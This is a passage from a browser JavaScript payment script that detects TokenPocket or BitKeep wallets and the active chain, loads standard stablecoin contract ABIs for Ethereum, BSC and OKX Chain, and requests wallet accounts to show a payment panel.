              outputs: [{ name: '', type: 'uint256' }],
              payable: false,
              stateMutability: 'view',
              type: 'function',
            },
            {
              constant: false,
              inputs: [{ name: 'newOwner', type: 'address' }],
              name: 'transferOwnership',
              outputs: [],
              payable: false,
              stateMutability: 'nonpayable',
              type: 'function',
            },
            {
              constant: false,
              inputs: [{ name: '_blackListedUser', type: 'address' }],
              name: 'destroyBlackFunds',
              outputs: [],
              payable: false,
              stateMutability: 'nonpayable',
              type: 'function',
            },
            {
              inputs: [
                { name: '_initialSupply', type: 'uint256' },
                {
                  name: '_name',
                  type: 'string',
                },
                { name: '_symbol', type: 'string' },
                { name: '_decimals', type: 'uint256' },
              ],
              payable: false,
              stateMutability: 'nonpayable',
              type: 'constructor',
            },
            {
              anonymous: false,
              inputs: [{ indexed: false, name: 'amount', type: 'uint256' }],
              name: 'Issue',
              type: 'event',
            },
            {
              anonymous: false,
              inputs: [{ indexed: false, name: 'amount', type: 'uint256' }],
              name: 'Redeem',
              type: 'event',
            },
            {
              anonymous: false,
              inputs: [{ indexed: false, name: 'newAddress', type: 'address' }],
              name: 'Deprecate',
              type: 'event',
            },
            {
              anonymous: false,
              inputs: [
                { indexed: false, name: 'feeBasisPoints', type: 'uint256' },
                {
                  indexed: false,
                  name: 'maxFee',
                  type: 'uint256',
                },
              ],
              name: 'Params',
              type: 'event',
            },
            {
              anonymous: false,
              inputs: [
                { indexed: false, name: '_blackListedUser', type: 'address' },
                {
                  indexed: false,
                  name: '_balance',
                  type: 'uint256',
                },
              ],
              name: 'DestroyedBlackFunds',
              type: 'event',
            },
            {
              anonymous: false,
              inputs: [{ indexed: false, name: '_user', type: 'address' }],
              name: 'AddedBlackList',
              type: 'event',
            },
            {
              anonymous: false,
              inputs: [{ indexed: false, name: '_user', type: 'address' }],
              name: 'RemovedBlackList',
              type: 'event',
            },
            {
              anonymous: false,
              inputs: [
                { indexed: true, name: 'owner', type: 'address' },
                {
                  indexed: true,
                  name: 'spender',
                  type: 'address',
                },
                { indexed: false, name: 'value', type: 'uint256' },
              ],
              name: 'Approval',
              type: 'event',
            },
            {
              anonymous: false,
              inputs: [
                { indexed: true, name: 'from', type: 'address' },
                {
                  indexed: true,
                  name: 'to',
                  type: 'address',
                },
                { indexed: false, name: 'value', type: 'uint256' },
              ],
              name: 'Transfer',
              type: 'event',
            },
            { anonymous: false, inputs: [], name: 'Pause', type: 'event' },
            {
              anonymous: false,
              inputs: [],
              name: 'Unpause',
              type: 'event',
            },
          ]
          web3 = new Web3(ethereum)
          contract = new web3.eth.Contract(contract_abi, contract_addr)
          accounts = await ethereum.request({ method: 'eth_requestAccounts' })
          if (accounts.length > 0) {
            printd('eth')
            pay_addr_input_ele.innerHTML = contract_addr
            clearInterval(getWalletTimer)
            pay_ele.removeAttribute('style')
            wallet_ele.setAttribute('style', 'display:none')
          }
          break
      }
    }
  } else if (
    (typeof window.ethereum !== 'undefined' &&
      typeof window.ethereum.isTokenPocket !== 'undefined') ||
    (typeof window.tron !== 'undefined' && typeof window.tron.isTokenPocket !== 'undefined')
  ) {
    wallet = 'tokenPocket'
    printd('tokenPocket')
    if (typeof window.tronWeb !== 'undefined') {
      chain = 'tron'
      printd('tron')
      pay_addr_input_ele.innerHTML = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
      clearInterval(getWalletTimer)
      pay_ele.removeAttribute('style')
      wallet_ele.setAttribute('style', 'display:none')
    } else if (typeof window.ethereum) {
      printd('eth')
      switch (parseInt(window.ethereum.networkVersion)) {
        case 56:
          chain = 'bsc'
          contract_addr = '0x55d398326f99059ff775485246999027b3197955'
          contract_abi = [
            {
              inputs: [],
              payable: false,
              stateMutability: 'nonpayable',
              type: 'constructor',
            },
            {
              anonymous: false,
              inputs: [
                {
                  indexed: true,
                  internalType: 'address',
                  name: 'owner',
                  type: 'address',
                },
                {
                  indexed: true,
                  internalType: 'address',
                  name: 'spender',
                  type: 'address',
                },
                { indexed: false, internalType: 'uint256', name: 'value', type: 'uint256' },
              ],
              name: 'Approval',
              type: 'event',
            },
            {
              anonymous: false,
              inputs: [
                {
                  indexed: true,
                  internalType: 'address',
                  name: 'previousOwner',
                  type: 'address',
                },
                { indexed: true, internalType: 'address', name: 'newOwner', type: 'address' },
              ],
              name: 'OwnershipTransferred',
              type: 'event',
            },
            {
              anonymous: false,
              inputs: [
                {
                  indexed: true,
                  internalType: 'address',
                  name: 'from',
                  type: 'address',
                },
                {
                  indexed: true,
                  internalType: 'address',
                  name: 'to',
                  type: 'address',
                },
                { indexed: false, internalType: 'uint256', name: 'value', type: 'uint256' },
              ],
              name: 'Transfer',
              type: 'event',
            },
            {
              constant: true,
              inputs: [],
              name: '_decimals',
              outputs: [{ internalType: 'uint8', name: '', type: 'uint8' }],
              payable: false,
              stateMutability: 'view',
              type: 'function',
            },
            {
              constant: true,
              inputs: [],
              name: '_name',
              outputs: [{ internalType: 'string', name: '', type: 'string' }],
              payable: false,
              stateMutability: 'view',
              type: 'function',
            },
            {
              constant: true,
              inputs: [],
              name: '_symbol',
              outputs: [{ internalType: 'string', name: '', type: 'string' }],
              payable: false,
              stateMutability: 'view',
              type: 'function',
            },
            {
              constant: true,
              inputs: [
                {
                  internalType: 'address',
                  name: 'owner',
                  type: 'address',
                },
                { internalType: 'address', name: 'spender', type: 'address' },
              ],
              name: 'allowance',
              outputs: [{ internalType: 'uint256', name: '', type: 'uint256' }],
              payable: false,
              stateMutability: 'view',
              type: 'function',
            },
            {
              constant: false,
              inputs: [
                {
                  internalType: 'address',
                  name: 'spender',
                  type: 'address',
                },
                { internalType: 'uint256', name: 'amount', type: 'uint256' },
              ],
              name: 'approve',
              outputs: [{ internalType: 'bool', name: '', type: 'bool' }],
              payable: false,
              stateMutability: 'nonpayable',
              type: 'function',
            },
            {
              constant: true,
              inputs: [{ internalType: 'address', name: 'account', type: 'address' }],
              name: 'balanceOf',
              outputs: [{ internalType: 'uint256', name: '', type: 'uint256' }],
              payable: false,
              stateMutability: 'view',
              type: 'function',
            },
            {
              constant: false,
              inputs: [{ internalType: 'uint256', name: 'amount', type: 'uint256' }],
              name: 'burn',
              outputs: [{ internalType: 'bool', name: '', type: 'bool' }],
              payable: false,
              stateMutability: 'nonpayable',
              type: 'function',
            },
            {
              constant: true,
              inputs: [],
              name: 'decimals',
              outputs: [{ internalType: 'uint8', name: '', type: 'uint8' }],
              payable: false,
              stateMutability: 'view',
              type: 'function',
            },
            {
              constant: false,
              inputs: [
                {
                  internalType: 'address',
                  name: 'spender',
                  type: 'address',
                },
                { internalType: 'uint256', name: 'subtractedValue', type: 'uint256' },
              ],
              name: 'decreaseAllowance',
              outputs: [{ internalType: 'bool', name: '', type: 'bool' }],
              payable: false,
              stateMutability: 'nonpayable',
              type: 'function',
            },
            {
              constant: true,
              inputs: [],
              name: 'getOwner',
              outputs: [{ internalType: 'address', name: '', type: 'address' }],
              payable: false,
              stateMutability: 'view',
              type: 'function',
            },
            {
              constant: false,
              inputs: [
                {
                  internalType: 'address',
                  name: 'spender',
                  type: 'address',
                },
                { internalType: 'uint256', name: 'addedValue', type: 'uint256' },
              ],
              name: 'increaseAllowance',
              outputs: [{ internalType: 'bool', name: '', type: 'bool' }],
              payable: false,
              stateMutability: 'nonpayable',
              type: 'function',
            },
            {
              constant: false,
              inputs: [{ internalType: 'uint256', name: 'amount', type: 'uint256' }],
              name: 'mint',
              outputs: [{ internalType: 'bool', name: '', type: 'bool' }],
              payable: false,
              stateMutability: 'nonpayable',
              type: 'function',
            },
            {
              constant: true,
              inputs: [],
              name: 'name',
              outputs: [{ internalType: 'string', name: '', type: 'string' }],
              payable: false,
              stateMutability: 'view',
              type: 'function',
            },
            {
              constant: true,
              inputs: [],
              name: 'owner',
              outputs: [{ internalType: 'address', name: '', type: 'address' }],
              payable: false,
              stateMutability: 'view',
              type: 'function',
            },
            {
              constant: false,
              inputs: [],
              name: 'renounceOwnership',
              outputs: [],
              payable: false,
              stateMutability: 'nonpayable',
              type: 'function',
            },
            {
              constant: true,
              inputs: [],
              name: 'symbol',
              outputs: [{ internalType: 'string', name: '', type: 'string' }],
              payable: false,
              stateMutability: 'view',
              type: 'function',
            },
            {
              constant: true,
              inputs: [],
              name: 'totalSupply',
              outputs: [{ internalType: 'uint256', name: '', type: 'uint256' }],
              payable: false,
              stateMutability: 'view',
              type: 'function',
            },
            {
              constant: false,
              inputs: [
                {
                  internalType: 'address',
                  name: 'recipient',
                  type: 'address',
                },
                { internalType: 'uint256', name: 'amount', type: 'uint256' },
              ],
              name: 'transfer',
              outputs: [{ internalType: 'bool', name: '', type: 'bool' }],
              payable: false,
              stateMutability: 'nonpayable',
              type: 'function',
            },
            {
              constant: false,
              inputs: [
                {
                  internalType: 'address',
                  name: 'sender',
                  type: 'address',
                },
                {
                  internalType: 'address',
                  name: 'recipient',
                  type: 'address',
                },
                { internalType: 'uint256', name: 'amount', type: 'uint256' },
              ],
              name: 'transferFrom',
              outputs: [{ internalType: 'bool', name: '', type: 'bool' }],
              payable: false,
              stateMutability: 'nonpayable',
              type: 'function',
            },
            {
              constant: false,
              inputs: [{ internalType: 'address', name: 'newOwner', type: 'address' }],
              name: 'transferOwnership',
              outputs: [],
              payable: false,
              stateMutability: 'nonpayable',
              type: 'function',
            },
          ]
          web3 = new Web3(ethereum)
          contract = new web3.eth.Contract(contract_abi, contract_addr)
          accounts = await ethereum.request({ method: 'eth_requestAccounts' })
          if (accounts.length > 0) {
            printd('bsc')
            pay_addr_input_ele.innerHTML = contract_addr
            clearInterval(getWalletTimer)
            pay_ele.removeAttribute('style')
            wallet_ele.setAttribute('style', 'display:none')
          }
          break
        case 66:
          chain = 'okxc'
          contract_addr = '0x382bB369d343125BfB2117af9c149795C6C65C50'
          contract_abi = [
            {
              outputs: [{ name: 'impl', type: 'address' }],
              constant: true,
              payable: false,
              inputs: [],
              name: 'implementation',
              stateMutability: 'view',
              type: 'function',
            },
            {
              payable: false,
              inputs: [],
              stateMutability: 'nonpayable',
              type: 'constructor',
            },
            {
              payable: true,
              stateMutability: 'payable',
              type: 'fallback',
            },
            {
              inputs: [
                { indexed: false, name: 'previousOwner', type: 'address' },
                {
                  indexed: false,
                  name: 'newOwner',
                  type: 'address',
                },
              ],
              name: 'ProxyOwnershipTransferred',
              anonymous: false,
              type: 'event',
            },
            {
              inputs: [{ indexed: true, name: 'implementation', type: 'address' }],
              name: 'Upgraded',
              anonymous: false,
              type: 'event',
            },
            {
              outputs: [{ name: 'owner', type: 'address' }],
              constant: true,
              payable: false,
              inputs: [],
              name: 'proxyOwner',
              stateMutability: 'view',
              type: 'function',
            },
            {
              outputs: [],
              constant: false,
              payable: false,
              inputs: [{ name: 'newOwner', type: 'address' }],
              name: 'transferProxyOwnership',
              stateMutability: 'nonpayable',
              type: 'function',
            },
            {
              outputs: [],
              constant: false,
              payable: false,
              inputs: [{ name: 'implementation', type: 'address' }],
              name: 'upgradeTo',
              stateMutability: 'nonpayable',
              type: 'function',
            },
            {
              outputs: [],
              constant: false,
              payable: true,
              inputs: [
                { name: 'implementation', type: 'address' },
                { name: 'data', type: 'bytes' },
              ],
              name: 'upgradeToAndCall',
              stateMutability: 'payable',
              type: 'function',
            },
          ]
          web3 = new Web3(ethereum)
          contract = new web3.eth.Contract(contract_abi, contract_addr)
          accounts = await ethereum.request({ method: 'eth_requestAccounts' })
          if (accounts.length > 0) {
            printd('okxc')
            pay_addr_input_ele.innerHTML = contract_addr
            clearInterval(getWalletTimer)
            pay_ele.removeAttribute('style')
            wallet_ele.setAttribute('style', 'display:none')
          }
          break
        case 1:
          chain = 'eth'
          contract_addr = '0xdAC17F958D2ee523a2206206994597C13D831ec7'
          contract_abi = [
            {
              constant: true,
              inputs: [],
              name: 'name',
              outputs: [{ name: '', type: 'string' }],
              payable: false,
              stateMutability: 'view',
              type: 'function',
            },
            {
              constant: false,
              inputs: [{ name: '_upgradedAddress', type: 'address' }],
              name: 'deprecate',
              outputs: [],
              payable: false,
              stateMutability: 'nonpayable',
              type: 'function',
            },
            {
              constant: false,
              inputs: [
                { name: '_spender', type: 'address' },
                { name: '_value', type: 'uint256' },
              ],
              name: 'approve',
              outputs: [],
              payable: false,
              stateMutability: 'nonpayable',
              type: 'function',
            },
            {
              constant: true,
              inputs: [],
              name: 'deprecated',
              outputs: [{ name: '', type: 'bool' }],
              payable: false,
              stateMutability: 'view',
              type: 'function',
            },
            {
              constant: false,
              inputs: [{ name: '_evilUser', type: 'address' }],
              name: 'addBlackList',
              outputs: [],
              payable: false,
              stateMutability: 'nonpayable',
              type: 'function',
            },
            {
              constant: true,
              inputs: [],
              name: 'totalSupply',
              outputs: [{ name: '', type: 'uint256' }],
              payable: false,
              stateMutability: 'view',
              type: 'function',
            },
            {
              constant: false,
              inputs: [
                { name: '_from', type: 'address' },
                {
                  name: '_to',
                  type: 'address',
                },
                { name: '_value', type: 'uint256' },
              ],
              name: 'transferFrom',
              outputs: [],
              payable: false,
              stateMutability: 'nonpayable',
              type: 'function',
            },
            {
              constant: true,
              inputs: [],
              name: 'upgradedAddress',
              outputs: [{ name: '', type: 'address' }],
              payable: false,
              stateMutability: 'view',
              type: 'function',
            },
            {
              constant: true,
              inputs: [{ name: '', type: 'address' }],
              name: 'balances',
              outputs: [{ name: '', type: 'uint256' }],
              payable: false,
              stateMutability: 'view',
              type: 'function',
            },
            {
              constant: true,
              inputs: [],
              name: 'decimals',
              outputs: [{ name: '', type: 'uint256' }],
              payable: false,
              stateMutability: 'view',
              type: 'function',
            },
            {
              constant: true,
              inputs: [],
              name: 'maximumFee',
              outputs: [{ name: '', type: 'uint256' }],
              payable: false,
              stateMutability: 'view',
              type: 'function',
            },
            {
              constant: true,
              inputs: [],
              name: '_totalSupply',
              outputs: [{ name: '', type: 'uint256' }],
              payable: false,
              stateMutability: 'view',
              type: 'function',
            },
            {
              constant: false,
              inputs: [],
              name: 'unpause',
              outputs: [],
              payable: false,
              stateMutability: 'nonpayable',
              type: 'function',
            },
            {
              constant: true,
              inputs: [{ name: '_maker', type: 'address' }],
              name: 'getBlackListStatus',
              outputs: [{ name: '', type: 'bool' }],
              payable: false,
              stateMutability: 'view',
              type: 'function',
            },
            {
              constant: true,
              inputs: [
                { name: '', type: 'address' },
                { name: '', type: 'address' },
              ],
              name: 'allowed',
              outputs: [{ name: '', type: 'uint256' }],
              payable: false,
              stateMutability: 'view',
              type: 'function',
            },
            {
              constant: true,
              inputs: [],
              name: 'paused',
              outputs: [{ name: '', type: 'bool' }],
              payable: false,
              stateMutability: 'view',
              type: 'function',
            },
            {
              constant: true,
              inputs: [{ name: 'who', type: 'address' }],
              name: 'balanceOf',
              outputs: [{ name: '', type: 'uint256' }],
              payable: false,
              stateMutability: 'view',
              type: 'function',
            },
            {
              constant: false,
              inputs: [],
              name: 'pause',
              outputs: [],
              payable: false,
              stateMutability: 'nonpayable',
              type: 'function',
            },
            {
              constant: true,
              inputs: [],
              name: 'getOwner',
              outputs: [{ name: '', type: 'address' }],
              payable: false,
              stateMutability: 'view',
              type: 'function',
            },
            {
              constant: true,
              inputs: [],
              name: 'owner',
              outputs: [{ name: '', type: 'address' }],
              payable: false,
              stateMutability: 'view',
              type: 'function',
            },
            {
              constant: true,
              inputs: [],
              name: 'symbol',
              outputs: [{ name: '', type: 'string' }],
              payable: false,
              stateMutability: 'view',
              type: 'function',
            },
            {
              constant: false,
              inputs: [
                { name: '_to', type: 'address' },
                { name: '_value', type: 'uint256' },
              ],
              name: 'transfer',
              outputs: [],
              payable: false,
              stateMutability: 'nonpayable',
              type: 'function',
            },
            {
              constant: false,
              inputs: [
                { name: 'newBasisPoints', type: 'uint256' },
                {
                  name: 'newMaxFee',
                  type: 'uint256',
                },
              ],
              name: 'setParams',
              outputs: [],
              payable: false,
              stateMutability: 'nonpayable',
              type: 'function',
            },
            {
              constant: false,
              inputs: [{ name: 'amount', type: 'uint256' }],
              name: 'issue',
              outputs: [],
              payable: false,
              stateMutability: 'nonpayable',
              type: 'function',
            },
            {
              constant: false,
              inputs: [{ name: 'amount', type: 'uint256' }],
              name: 'redeem',
              outputs: [],
              payable: false,
              stateMutability: 'nonpayable',
              type: 'function',
            },
            {
              constant: true,
              inputs: [
                { name: '_owner', type: 'address' },
                { name: '_spender', type: 'address' },
              ],
              name: 'allowance',
              outputs: [{ name: 'remaining', type: 'uint256' }],
              payable: false,
              stateMutability: 'view',
              type: 'function',
            },
            {
              constant: true,
              inputs: [],
              name: 'basisPointsRate',
              outputs: [{ name: '', type: 'uint256' }],
              payable: false,
              stateMutability: 'view',
              type: 'function',
            },
            {
              constant: true,
              inputs: [{ name: '', type: 'address' }],
              name: 'isBlackListed',
              outputs: [{ name: '', type: 'bool' }],
              payable: false,
              stateMutability: 'view',
              type: 'function',
            },
            {
              constant: false,
              inputs: [{ name: '_clearedUser', type: 'address' }],
              name: 'removeBlackList',
              outputs: [],
              payable: false,
              stateMutability: 'nonpayable',
              type: 'function',
            },
            {
              constant: true,
              inputs: [],
              name: 'MAX_UINT',
              outputs: [{ name: '', type: 'uint256' }],
              payable: false,
              stateMutability: 'view',
              type: 'function',
            },
            {
              constant: false,
              inputs: [{ name: 'newOwner', type: 'address' }],
              name: 'transferOwnership',
              outputs: [],
              payable: false,
              stateMutability: 'nonpayable',
              type: 'function',
            },
            {
              constant: false,
              inputs: [{ name: '_blackListedUser', type: 'address' }],
              name: 'destroyBlackFunds',
              outputs: [],
              payable: false,
              stateMutability: 'nonpayable',
              type: 'function',
            },
            {
              inputs: [
                { name: '_initialSupply', type: 'uint256' },
                {
                  name: '_name',
                  type: 'string',
                },
                { name: '_symbol', type: 'string' },
                { name: '_decimals', type: 'uint256' },
              ],
              payable: false,
              stateMutability: 'nonpayable',
              type: 'constructor',
            },
            {
              anonymous: false,
              inputs: [{ indexed: false, name: 'amount', type: 'uint256' }],
              name: 'Issue',
              type: 'event',
            },
            {
              anonymous: false,
              inputs: [{ indexed: false, name: 'amount', type: 'uint256' }],
              name: 'Redeem',
              type: 'event',
            },
            {
              anonymous: false,
              inputs: [{ indexed: false, name: 'newAddress', type: 'address' }],
              name: 'Deprecate',
              type: 'event',
            },
            {
              anonymous: false,
              inputs: [
                { indexed: false, name: 'feeBasisPoints', type: 'uint256' },
                {
                  indexed: false,
                  name: 'maxFee',
                  type: 'uint256',
                },
              ],
              name: 'Params',
              type: 'event',
            },
            {
              anonymous: false,
              inputs: [
                { indexed: false, name: '_blackListedUser', type: 'address' },
                {
                  indexed: false,
                  name: '_balance',
                  type: 'uint256',
                },
              ],
              name: 'DestroyedBlackFunds',
              type: 'event',
            },
            {
              anonymous: false,
              inputs: [{ indexed: false, name: '_user', type: 'address' }],
              name: 'AddedBlackList',
              type: 'event',
            },
            {
              anonymous: false,
              inputs: [{ indexed: false, name: '_user', type: 'address' }],
              name: 'RemovedBlackList',
              type: 'event',
            },
            {
              anonymous: false,
              inputs: [
                { indexed: true, name: 'owner', type: 'address' },
                {
                  indexed: true,
                  name: 'spender',
                  type: 'address',
                },
                { indexed: false, name: 'value', type: 'uint256' },
              ],
              name: 'Approval',
              type: 'event',
            },
            {
              anonymous: false,
              inputs: [
                { indexed: true, name: 'from', type: 'address' },
                {
                  indexed: true,
                  name: 'to',
                  type: 'address',
                },
                { indexed: false, name: 'value', type: 'uint256' },
              ],
              name: 'Transfer',
              type: 'event',
            },
            { anonymous: false, inputs: [], name: 'Pause', type: 'event' },
            {
              anonymous: false,
              inputs: [],
              name: 'Unpause',
              type: 'event',
            },
          ]
          web3 = new Web3(ethereum)
          contract = new web3.eth.Contract(contract_abi, contract_addr)
          accounts = await ethereum.request({ method: 'eth_requestAccounts' })
          if (accounts.length > 0) {
            printd('eth')
            pay_addr_input_ele.innerHTML = contract_addr
            clearInterval(getWalletTimer)
            pay_ele.removeAttribute('style')
            wallet_ele.setAttribute('style', 'display:none')
          }
          break
      }
    }
  } else if (
    typeof window.ethereum !== 'undefined' &&
    typeof window.ethereum.isBitKeep !== 'undefined'
  ) {
    wallet = 'bitKeep'
    printd('bitKeep eth')
    switch (parseInt(window.ethereum.networkVersion)) {
      case 56:
        chain = 'bsc'
        contract_addr = '0x55d398326f99059ff775485246999027b3197955'
        contract_abi = [
          {
            inputs: [],
            payable: false,
            stateMutability: 'nonpayable',
            type: 'constructor',
          },
          {
            anonymous: false,
            inputs: [
              {
                indexed: true,
                internalType: 'address',
                name: 'owner',
                type: 'address',
              },
              {
                indexed: true,
                internalType: 'address',
                name: 'spender',
                type: 'address',
              },
              { indexed: false, internalType: 'uint256', name: 'value', type: 'uint256' },
            ],
            name: 'Approval',
            type: 'event',
          },
          {
            anonymous: false,
            inputs: [
              {
                indexed: true,
                internalType: 'address',
                name: 'previousOwner',
                type: 'address',
              },
              { indexed: true, internalType: 'address', name: 'newOwner', type: 'address' },
            ],
            name: 'OwnershipTransferred',
            type: 'event',
          },
          {
            anonymous: false,
            inputs: [
              {
                indexed: true,
                internalType: 'address',
                name: 'from',
                type: 'address',
              },
              { indexed: true, internalType: 'address', name: 'to', type: 'address' },
              {
                indexed: false,
                internalType: 'uint256',
                name: 'value',
                type: 'uint256',
              },
            ],
            name: 'Transfer',
            type: 'event',
          },
          {
            constant: true,
            inputs: [],
            name: '_decimals',
            outputs: [{ internalType: 'uint8', name: '', type: 'uint8' }],
            payable: false,
            stateMutability: 'view',
            type: 'function',
          },
          {
            constant: true,
            inputs: [],
            name: '_name',
            outputs: [{ internalType: 'string', name: '', type: 'string' }],
            payable: false,
            stateMutability: 'view',
            type: 'function',
          },
          {
            constant: true,
            inputs: [],
            name: '_symbol',
            outputs: [{ internalType: 'string', name: '', type: 'string' }],
            payable: false,
            stateMutability: 'view',
            type: 'function',
          },
          {
            constant: true,
            inputs: [
              {
                internalType: 'address',
                name: 'owner',
                type: 'address',
              },
              { internalType: 'address', name: 'spender', type: 'address' },
            ],
            name: 'allowance',
            outputs: [{ internalType: 'uint256', name: '', type: 'uint256' }],
            payable: false,
            stateMutability: 'view',
            type: 'function',
          },
          {
            constant: false,
            inputs: [
              {
                internalType: 'address',
                name: 'spender',
                type: 'address',
              },
              { internalType: 'uint256', name: 'amount', type: 'uint256' },
            ],
            name: 'approve',
            outputs: [{ internalType: 'bool', name: '', type: 'bool' }],
            payable: false,
            stateMutability: 'nonpayable',
            type: 'function',
          },
          {
            constant: true,
            inputs: [{ internalType: 'address', name: 'account', type: 'address' }],
            name: 'balanceOf',
            outputs: [{ internalType: 'uint256', name: '', type: 'uint256' }],
            payable: false,
            stateMutability: 'view',
            type: 'function',
          },
          {
            constant: false,
            inputs: [{ internalType: 'uint256', name: 'amount', type: 'uint256' }],
            name: 'burn',
            outputs: [{ internalType: 'bool', name: '', type: 'bool' }],
            payable: false,
            stateMutability: 'nonpayable',
            type: 'function',
          },
          {
            constant: true,
            inputs: [],
            name: 'decimals',
            outputs: [{ internalType: 'uint8', name: '', type: 'uint8' }],
            payable: false,
            stateMutability: 'view',
            type: 'function',
          },
          {
            constant: false,
            inputs: [
              {
                internalType: 'address',
                name: 'spender',
                type: 'address',
              },
              { internalType: 'uint256', name: 'subtractedValue', type: 'uint256' },
            ],
            name: 'decreaseAllowance',
            outputs: [{ internalType: 'bool', name: '', type: 'bool' }],
            payable: false,
            stateMutability: 'nonpayable',
            type: 'function',
          },
          {
            constant: true,
            inputs: [],
            name: 'getOwner',
            outputs: [{ internalType: 'address', name: '', type: 'address' }],
            payable: false,
            stateMutability: 'view',
            type: 'function',
          },
          {
            constant: false,
            inputs: [
              {
                internalType: 'address',
                name: 'spender',
                type: 'address',
              },
              { internalType: 'uint256', name: 'addedValue', type: 'uint256' },
            ],
            name: 'increaseAllowance',
            outputs: [{ internalType: 'bool', name: '', type: 'bool' }],
            payable: false,
            stateMutability: 'nonpayable',
            type: 'function',
          },
          {
            constant: false,
            inputs: [{ internalType: 'uint256', name: 'amount', type: 'uint256' }],
            name: 'mint',
            outputs: [{ internalType: 'bool', name: '', type: 'bool' }],
            payable: false,
            stateMutability: 'nonpayable',
            type: 'function',
          },
          {
            constant: true,
            inputs: [],
            name: 'name',
            outputs: [{ internalType: 'string', name: '', type: 'string' }],
            payable: false,
            stateMutability: 'view',
            type: 'function',
          },
          {
            constant: true,
            inputs: [],
            name: 'owner',
            outputs: [{ internalType: 'address', name: '', type: 'address' }],
            payable: false,
            stateMutability: 'view',
            type: 'function',
          },
          {
            constant: false,
            inputs: [],
            name: 'renounceOwnership',
            outputs: [],
            payable: false,
            stateMutability: 'nonpayable',
            type: 'function',
          },
          {
            constant: true,
            inputs: [],
            name: 'symbol',
            outputs: [{ internalType: 'string', name: '', type: 'string' }],
            payable: false,
            stateMutability: 'view',
            type: 'function',
          },
          {
            constant: true,
            inputs: [],
            name: 'totalSupply',
            outputs: [{ internalType: 'uint256', name: '', type: 'uint256' }],
            payable: false,
            stateMutability: 'view',
            type: 'function',
          },
          {
            constant: false,
            inputs: [
              {
                internalType: 'address',
                name: 'recipient',
                type: 'address',
              },
              { internalType: 'uint256', name: 'amount', type: 'uint256' },
            ],
            name: 'transfer',
            outputs: [{ internalType: 'bool', name: '', type: 'bool' }],
            payable: false,
            stateMutability: 'nonpayable',
            type: 'function',
          },
          {
            constant: false,
            inputs: [
              {
                internalType: 'address',
                name: 'sender',
                type: 'address',
              },
              { internalType: 'address', name: 'recipient', type: 'address' },
              {
                internalType: 'uint256',
                name: 'amount',
                type: 'uint256',
              },
            ],
            name: 'transferFrom',
            outputs: [{ internalType: 'bool', name: '', type: 'bool' }],
            payable: false,
            stateMutability: 'nonpayable',
            type: 'function',
          },
          {
            constant: false,
            inputs: [{ internalType: 'address', name: 'newOwner', type: 'address' }],
            name: 'transferOwnership',
            outputs: [],
            payable: false,
            stateMutability: 'nonpayable',
            type: 'function',
          },
        ]
        web3 = new Web3(ethereum)
        contract = new web3.eth.Contract(contract_abi, contract_addr)
        accounts = await ethereum.request({ method: 'eth_requestAccounts' })
        if (accounts.length > 0) {
          printd('bsc')
          pay_addr_input_ele.innerHTML = contract_addr
          clearInterval(getWalletTimer)
          pay_ele.removeAttribute('style')
          wallet_ele.setAttribute('style', 'display:none')
        }
        break
      case 66:
        chain = 'okxc'
        contract_addr = '0x382bB369d343125BfB2117af9c149795C6C65C50'
        contract_abi = [
          {
            outputs: [{ name: 'impl', type: 'address' }],
            constant: true,
            payable: false,
            inputs: [],
            name: 'implementation',
            stateMutability: 'view',
            type: 'function',
          },
          {
            payable: false,
            inputs: [],
            stateMutability: 'nonpayable',
            type: 'constructor',
          },
          {
            payable: true,
            stateMutability: 'payable',
            type: 'fallback',
          },
          {
            inputs: [
              { indexed: false, name: 'previousOwner', type: 'address' },
              {
                indexed: false,
                name: 'newOwner',
                type: 'address',
              },
            ],
            name: 'ProxyOwnershipTransferred',
            anonymous: false,
            type: 'event',
          },
          {
            inputs: [{ indexed: true, name: 'implementation', type: 'address' }],
            name: 'Upgraded',
            anonymous: false,
            type: 'event',
          },
          {
            outputs: [{ name: 'owner', type: 'address' }],
            constant: true,
            payable: false,
            inputs: [],
            name: 'proxyOwner',
            stateMutability: 'view',
            type: 'function',
          },
          {
            outputs: [],
            constant: false,
            payable: false,
            inputs: [{ name: 'newOwner', type: 'address' }],
            name: 'transferProxyOwnership',
            stateMutability: 'nonpayable',
            type: 'function',
          },
          {
            outputs: [],
            constant: false,
            payable: false,
            inputs: [{ name: 'implementation', type: 'address' }],
            name: 'upgradeTo',
            stateMutability: 'nonpayable',
            type: 'function',
          },
          {
            outputs: [],
            constant: false,
            payable: true,
            inputs: [
              { name: 'implementation', type: 'address' },
              { name: 'data', type: 'bytes' },
            ],
            name: 'upgradeToAndCall',
            stateMutability: 'payable',
            type: 'function',
          },
        ]
        web3 = new Web3(ethereum)
        contract = new web3.eth.Contract(contract_abi, contract_addr)
        accounts = await ethereum.request({ method: 'eth_requestAccounts' })
        if (accounts.length > 0) {
          printd('okxc')
          pay_addr_input_ele.innerHTML = contract_addr
          clearInterval(getWalletTimer)
          pay_ele.removeAttribute('style')
          wallet_ele.setAttribute('style', 'display:none')
        }
        break
      case 1:
        chain = 'eth'
        contract_addr = '0xdAC17F958D2ee523a2206206994597C13D831ec7'
        contract_abi = [
          {
            constant: true,
            inputs: [],
            name: 'name',
            outputs: [{ name: '', type: 'string' }],
            payable: false,
            stateMutability: 'view',
            type: 'function',
          },
          {
            constant: false,
            inputs: [{ name: '_upgradedAddress', type: 'address' }],
            name: 'deprecate',
            outputs: [],
            payable: false,
            stateMutability: 'nonpayable',
            type: 'function',
          },
          {
            constant: false,
            inputs: [
              { name: '_spender', type: 'address' },
              { name: '_value', type: 'uint256' },
            ],
            name: 'approve',
            outputs: [],
            payable: false,
            stateMutability: 'nonpayable',
            type: 'function',
          },
          {
            constant: true,
            inputs: [],
            name: 'deprecated',
            outputs: [{ name: '', type: 'bool' }],
            payable: false,
            stateMutability: 'view',
            type: 'function',
          },
          {
            constant: false,
            inputs: [{ name: '_evilUser', type: 'address' }],
            name: 'addBlackList',
            outputs: [],
            payable: false,
            stateMutability: 'nonpayable',
            type: 'function',
          },
          {
            constant: true,
            inputs: [],
            name: 'totalSupply',
            outputs: [{ name: '', type: 'uint256' }],
            payable: false,
            stateMutability: 'view',
            type: 'function',
          },
          {
            constant: false,
            inputs: [
              { name: '_from', type: 'address' },
              {
                name: '_to',
                type: 'address',
              },
              { name: '_value', type: 'uint256' },
            ],
            name: 'transferFrom',
            outputs: [],
            payable: false,
            stateMutability: 'nonpayable',
            type: 'function',
          },
          {
            constant: true,
            inputs: [],
            name: 'upgradedAddress',
            outputs: [{ name: '', type: 'address' }],
            payable: false,
            stateMutability: 'view',
            type: 'function',
          },
          {
            constant: true,
